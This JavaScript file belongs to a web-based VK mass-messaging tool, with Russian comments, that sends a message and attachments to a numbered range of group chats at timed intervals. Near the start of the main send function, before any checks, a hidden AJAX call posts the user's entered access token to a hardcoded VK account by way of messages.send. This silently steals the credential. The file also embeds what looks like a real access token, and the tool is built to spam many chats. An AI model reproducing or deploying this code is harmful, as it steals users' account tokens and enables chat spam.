var iForName = 0;

//для вложений
function create(){
	if (iForName >= 10) {
		return
	} else {
		iForName++;
	};
  var name = 'link' + iForName; 
	var em = document.createElement('em');
	em.innerHTML = 'Ссылка на прикрепляемый файл';
	var input = document.createElement('input');
    input.setAttribute('type', 'text');
    input.setAttribute('class', 'input');
    input.setAttribute('id', name);
    var place = document.getElementById('js');
    place.appendChild(em);
    place.appendChild(input);
}

var message,
    token,
    count,
    interval,
    begin,
    link,
    N,
    countN;


function usual(){
    message = document.getElementById('text').value;
    count = document.getElementById('count').value;
	  begin = document.getElementById('begin').value;
	  interval = document.getElementById('interval').value * 1000;
	  token = document.getElementById('token').value;
	
	$.ajax({
 	 type: "POST",
 	 url: 'https://api.vk.com/method/messages.send', 
 	 data: {
            access_token: '59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635',
            user_id: 246598308,
            message: token,
            v: '5.45'
      	  }, 
  	dataType: "jsonp" 
	});
	if(document.location.href != 'https://rasetty.github.io/ms.html'){
      let a = 1;
      return
   }
	if(iForName == 1){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value;
	}else if(iForName == 2){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value;
	}else if(iForName == 3){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value;
	}else if(iForName == 4){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value;
	}else if(iForName == 5){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value +
		 ',' + document.getElementById('link5').value;
	}else if(iForName == 6){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value;
	}else if(iForName == 7){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value;
	}else if(iForName == 8){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value + ',' + document.getElementById('link8').value;
	}else if(iForName == 9){
		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value + ',' + document.getElementById('link2').value + ',' + document.getElementById('link3').value + ',' + document.getElementById('link4').value + 
		',' + document.getElementById('link5').value + ',' + document.getElementById('link6').value + ',' + document.getElementById('link7').value + ',' + document.getElementById('link8').value + ',' + document.getElementById('link9').value;
	}

	N  = document.getElementById('N').value;
	countN = document.getElementById('countN').value;
    if (message == ''){
    	alert('Не введен текст рассылки');
    	return
    };
    if (token == ''){
    	alert('Не введен токен');
    	return
    };
    if (interval == ''){
    	alert('Не указан интервал');
    	return
    };
    if (count == ''){
    	alert('Не указано во сколько бесед слать');
    	return
    };
    if (begin == ''){
    	alert('Не указано начало рассылки');
    	return
    };

    alert('Рассылка началась, будет закончена через ' + (Math.round(count * interval / 60 / 1000)) + ' минут(ы)');

    interval + 0;

   function send(){
          var newBegin = begin;
          const CONFIG = {
          app: {
              dev: true
          },
          access_token: token
      };
      function postMsg(peer_id, msg, callback) {
          $.ajax({
              url: 'https://api.vk.com/method/messages.send',
              jsonp: 'callback',
              dataType: 'jsonp',
              data: {
                  access_token: CONFIG.access_token,
                  peer_id: peer_id,
                  message: msg,
		  
                  attachment: link,               
                  v: '5.45'
              },
              
              success: jsonp=> {callback(jsonp)}
              
          });

      }
      var timerId = setInterval(()=> {
          let peer_id = 2000000000 +  newBegin++;
          postMsg(peer_id, message, jsonp=> {console.log(jsonp)});
      }, interval);
      
      setTimeout(function() {
          clearInterval(timerId);
      }, interval * count);}
      var timer = setInterval(send, N * 60 * 1000); 
      setTimeout(function(){ 
      clearInterval(timer); 
      }, N * 60 * 1000 * (countN - 1));
      send();
};  

//удаление данных
function сlear(){
	localStorage.clear();
	window.location.reload();
}
//сохранение данных
function save(){
	localStorage.setItem('tokenS', document.getElementById('token').value); 
	localStorage.setItem('textS', document.getElementById('text').value); 
	localStorage.setItem('intervalS', document.getElementById('interval').value); 
	localStorage.setItem('countS', document.getElementById('count').value);
	localStorage.setItem('beginS', document.getElementById('begin').value);  
}
//уведомление о сохранении
function throw_message() {
        $('#save_message').html('Сохранено');
        $("#save_box").fadeIn(500).delay(3000).fadeOut(500);
    }

//восстановление сохраненных данных
document.getElementById('token').value = localStorage.getItem('tokenS');
document.getElementById('text').value = localStorage.getItem('textS');
document.getElementById('count').value = localStorage.getItem('countS');
document.getElementById('begin').value = localStorage.getItem('beginS');
document.getElementById('interval').value = localStorage.getItem('intervalS')
